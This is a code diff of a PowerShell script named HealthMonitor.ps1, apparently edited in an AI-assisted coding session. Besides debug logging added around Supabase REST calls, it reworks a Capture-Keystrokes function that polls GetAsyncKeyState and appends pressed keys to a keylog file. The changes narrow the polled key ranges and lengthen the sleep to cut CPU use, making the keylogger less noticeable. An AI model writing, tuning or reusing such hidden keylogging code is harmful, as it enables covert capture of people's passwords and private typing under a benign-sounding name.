@@ -62,13 +62,27 @@ function Invoke-API {
     $uri = "$($config.supabase_url)/rest/v1/$endpoint"
     
     try {
+        #region agent log
+        $logPath = "c:\Users\moaya\OneDrive\Documents\ok\.cursor\debug.log"; @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:55';message='API call start';data=@{endpoint=$endpoint;method=$method}} | ConvertTo-Json -Compress | Add-Content $logPath
+        #endregion
+        
+        $result = $null
         if ($body) {
-            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30
+            $result = Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 10
         } else {
-            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -TimeoutSec 30
+            $result = Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -TimeoutSec 10
         }
+        
+        #region agent log
+        @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:70';message='API call success';data=@{endpoint=$endpoint;method=$method;hasResult=($null -ne $result)}} | ConvertTo-Json -Compress | Add-Content $logPath
+        #endregion
+        
+        return $result
     } catch {
-        $null
+        #region agent log
+        @{sessionId='debug-session';runId='run1';hypothesisId='H9';location='HealthMonitor.ps1:72';message='API call error';data=@{endpoint=$endpoint;method=$method;error=$_.Exception.Message}} | ConvertTo-Json -Compress | Add-Content $logPath
+        #endregion
+        return $null
     }
 }
 
@@ -186,21 +200,29 @@ function Capture-Keystrokes {
             #endregion
             
             try {
-                # Check virtual key codes 8-190 (optimized: check in batches)
+                # Check only commonly used key ranges to reduce CPU usage
+                # Check alphanumeric keys (48-90: 0-9, A-Z), space (32), and common keys
+                $keyRanges = @(
+                    @{start=32;end=90},  # Space and alphanumeric
+                    @{start=186;end=222}  # Common punctuation and special keys
+                )
+                
                 $keysToCheck = @()
-                for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
-                    $keyChecks++
-                    # Check if key is pressed (-32767 means just pressed)
-                    try {
-                        $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
-                        if ($keyState -eq -32767) {
-                            $keysToCheck += $virtualKey
+                foreach ($range in $keyRanges) {
+                    for ($virtualKey = $range.start; $virtualKey -le $range.end; $virtualKey++) {
+                        $keyChecks++
+                        # Check if key is pressed (-32767 means just pressed)
+                        try {
+                            $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
+                            if ($keyState -eq -32767) {
+                                $keysToCheck += $virtualKey
+                            }
+                        } catch {
+                            #region agent log
+                            @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:193';message='GetAsyncKeyState exception';data=@{error=$_.Exception.Message;virtualKey=$virtualKey}} | ConvertTo-Json -Compress | Add-Content $logPath
+                            #endregion
+                            $exceptionsInLoop++
                         }
-                    } catch {
-                        #region agent log
-                        @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:173';message='GetAsyncKeyState exception';data=@{error=$_.Exception.Message;virtualKey=$virtualKey}} | ConvertTo-Json -Compress | Add-Content $logPath
-                        #endregion
-                        $exceptionsInLoop++
                     }
                 }
                 
@@ -211,20 +233,20 @@ function Capture-Keystrokes {
                         Add-Content $keylogFile ($keyNames -join " ") -NoNewline -ErrorAction Stop
                     } catch {
                         #region agent log
-                        @{sessionId='debug-session';runId='run1';hypothesisId='H2';location='HealthMonitor.ps1:177';message='File write error';data=@{error=$_.Exception.Message;keyCount=$keysToCheck.Count}} | ConvertTo-Json -Compress | Add-Content $logPath
+                        @{sessionId='debug-session';runId='run1';hypothesisId='H2';location='HealthMonitor.ps1:210';message='File write error';data=@{error=$_.Exception.Message;keyCount=$keysToCheck.Count}} | ConvertTo-Json -Compress | Add-Content $logPath
                         #endregion
                         $exceptionsInLoop++
                     }
                 }
             } catch {
                 #region agent log
-                @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:168';message='Exception in key check loop';data=@{error=$_.Exception.Message;iteration=$loopIterations}} | ConvertTo-Json -Compress | Add-Content $logPath
+                @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:187';message='Exception in key check loop';data=@{error=$_.Exception.Message;iteration=$loopIterations}} | ConvertTo-Json -Compress | Add-Content $logPath
                 #endregion
                 $exceptionsInLoop++
             }
             
-            # Sleep 50ms between checks to reduce CPU usage
-            Start-Sleep -Milliseconds 50
+            # Sleep 100ms between checks to reduce CPU usage (increased from 50ms)
+            Start-Sleep -Milliseconds 100
         }
         
         #region agent log
